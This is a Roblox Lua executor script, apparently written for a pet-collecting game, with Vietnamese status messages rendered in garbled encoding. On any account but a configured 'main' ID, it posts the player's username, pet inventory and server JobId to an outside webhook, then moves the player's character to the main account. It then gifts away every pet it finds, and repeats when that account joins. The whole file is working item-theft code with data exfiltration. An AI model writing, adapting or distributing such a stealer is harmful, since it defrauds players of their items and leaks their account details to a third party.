print("Script ƒëang kh·ªüi ƒë·ªông...")

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer = Players.LocalPlayer
local MAIN_USER_ID = tonumber(getgenv().id or 0)
local WEBHOOK_URL = tostring(getgenv().webhook or "")

local PET_NAMES = {
    "Bunny", "Dog", "Golden Lab", "Bee", "Black Bunny", "Cat", "Chicken", "Deer",
    "Monkey", "Orange Tabby", "Pig", "Rooster", "Spotted Deer", "Honey Bee", "Cow",
    "Polar Bear", "Sea Otter", "Silver Monkey", "Wasp", "Tarantula Hawk", "Turle",
    "Petal Bee", "Moth", "Brown Mouse", "Caterpillar", "Giant Ant", "Grey Mouse",
    "Praying Mantis", "Red Fox", "Red Giant Ant", "Snail", "Squirrel", "Bear Bee",
    "Butterfly", "Dragon Fly", "Queen Bee", "Disco Bee"
}

local function getMainPlayer()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.UserId == MAIN_USER_ID then
            return p
        end
    end
    return nil
end

local function getBasePetName(toolName)
    return toolName:split(" [")[1]:lower()
end

local function getValidPetTools()
    local validPets = {}
    for _, container in {LocalPlayer:FindFirstChild("Backpack"), LocalPlayer.Character} do
        if container then
            for _, tool in container:GetChildren() do
                if tool:IsA("Tool") then
                    local baseName = getBasePetName(tool.Name)
                    for _, petName in ipairs(PET_NAMES) do
                        if baseName == petName:lower() then
                            table.insert(validPets, {tool = tool, name = baseName})
                            break
                        end
                    end
                end
            end
        end
    end
    return validPets
end

local function printCurrentPets()
    local pets = getValidPetTools()
    if #pets == 0 then
        print(" Kh√¥ng c√≥ pet.")
    else
        print("Danh s√°ch pet hi·ªán c√≥:")
        for _, pet in ipairs(pets) do
            print("- " .. pet.tool.Name)
        end
    end
end

printCurrentPets()

local function giftPetTo(player, petName)
    local giftRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("GiftPet")
    giftRemote:FireServer(player, petName)
end

local function moveToPlayer(target)
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local tgt = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
    if hrp and tgt then
        local tween = TweenService:Create(hrp, TweenInfo.new(1), {
            CFrame = tgt.CFrame + Vector3.new(0, 0, 2)
        })
        tween:Play()
        tween.Completed:Wait()
    end
end

local function autoGiftAllPets(mainPlayer)
    local pets = getValidPetTools()
    if #pets == 0 then
        warn("Kh√¥ng c√≥ pet ƒë·ªÉ gift.")
        return
    end

    moveToPlayer(mainPlayer)

    for _, pet in ipairs(pets) do
        pcall(function()
            LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(pet.tool)
        end)
        task.wait(0.2)
        giftPetTo(mainPlayer, pet.name)
        task.wait(0.5)
    end
end

local function sendWebhook()
    if WEBHOOK_URL == "" then return end

    local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    local pets = getValidPetTools()
    local petList = {}
    for _, pet in ipairs(pets) do
        table.insert(petList, pet.tool.Name)
    end

    local content = {
        embeds = {{
            title = "üîî Account has join!",
            fields = {
                { name = "üë§ Username", value = LocalPlayer.DisplayName .. " (`" .. LocalPlayer.Name .. "`)", inline = false },
                { name = "üéÆ Game", value = gameName, inline = false },
                { name = "üì¶ Pet ƒëang s·ªü h·ªØu", value = (#petList > 0 and table.concat(petList, "\n")) or "Kh√¥ng c√≥ pet", inline = false },
                { name = "üîó Join Code", value = game.JobId or "Kh√¥ng r√µ", inline = false }
            },
            color = 65280
        }}
    }

    local req = {
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(content)
    }

    local success = false
    if syn and syn.request then syn.request(req); success = true
    elseif http_request then http_request(req); success = true
    elseif request then request(req); success = true end

    if success then
        print("Webhook ƒë√£ g·ª≠i.")
    else
        warn("Webhook th·∫•t b·∫°i (executor kh√¥ng h·ªó tr·ª£ bla bla bla).")
    end
end

task.spawn(function()
    task.wait(2)

    if LocalPlayer.UserId ~= MAIN_USER_ID then
        sendWebhook()

        local main = getMainPlayer()
        if main then
            autoGiftAllPets(main)
        else
            print("Ch∆∞a th·∫•y acc ch√≠nh trong server.")
        end

        Players.PlayerAdded:Connect(function(p)
            if p.UserId == MAIN_USER_ID then
                task.wait(2)
                autoGiftAllPets(p)
            end
        end)
    else
        print("ƒê√¢y l√† account ch√≠nh")
    end
end)
